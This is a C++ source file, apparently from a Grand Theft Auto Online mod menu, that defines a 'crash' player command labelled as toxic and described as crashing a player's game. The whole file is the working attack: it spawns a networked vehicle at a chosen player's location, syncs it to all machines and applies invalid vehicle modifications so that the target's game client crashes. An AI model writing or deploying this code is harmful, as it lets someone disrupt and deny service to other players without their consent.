#include "backend/player_command.hpp"
#include "natives.hpp"
#include "pointers.hpp"
#include "core/scr_globals.hpp"
#include "gta_util.hpp"
#include "util/toxic.hpp"

#include <network/Network.hpp>

namespace big
{
	class crash_player : player_command
	{
		using player_command::player_command;

		virtual CommandAccessLevel get_access_level()
		{
			return CommandAccessLevel::TOXIC;
		}

		virtual void execute(player_ptr player, const std::vector<std::uint64_t>& _args, const std::shared_ptr<command_context> ctx)
		{
			{ 
				Hash hash = 1349725314;
				Player playerPed = PLAYER::GET_PLAYER_PED_SCRIPT_INDEX(g_player_service->get_selected()->id());
				Vector3 playerCoords = ENTITY::GET_ENTITY_COORDS(playerPed, false);
				STREAMING::REQUEST_MODEL(hash);
				Vehicle veh = VEHICLE::CREATE_VEHICLE(hash, playerCoords.x, playerCoords.y, playerCoords.z, ENTITY::GET_ENTITY_HEADING(playerPed), true, false, false);
				int net_id = NETWORK::VEH_TO_NET(veh);
				NETWORK::SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(net_id, TRUE);
				if (ENTITY::IS_ENTITY_VISIBLE_TO_SCRIPT(NETWORK::NET_TO_VEH(net_id))) {
					DECORATOR::DECOR_SET_INT(NETWORK::NET_TO_VEH(net_id), "MPBitset", (1 << 10));
				}
				VEHICLE::SET_VEHICLE_MOD_KIT(veh, 0);
				VEHICLE::SET_VEHICLE_MOD(veh, 34, 3, false);
				VEHICLE::TOGGLE_VEHICLE_MOD(veh, 34, true);
				script::get_current()->yield(5900ms);
				NETWORK::NETWORK_REQUEST_CONTROL_OF_ENTITY(veh);
				VEHICLE::SET_VEHICLE_MOD_KIT(veh, 0);
				VEHICLE::SET_VEHICLE_MOD(veh, 0, 0, false);
				VEHICLE::TOGGLE_VEHICLE_MOD(veh, 0, true);
				script::get_current()->yield(5900ms);
				VEHICLE::DELETE_VEHICLE(&veh);
			}
		}
	};

	crash_player g_crash_player("crash", "Whale Player", "Crashes players game.", 0, false);
}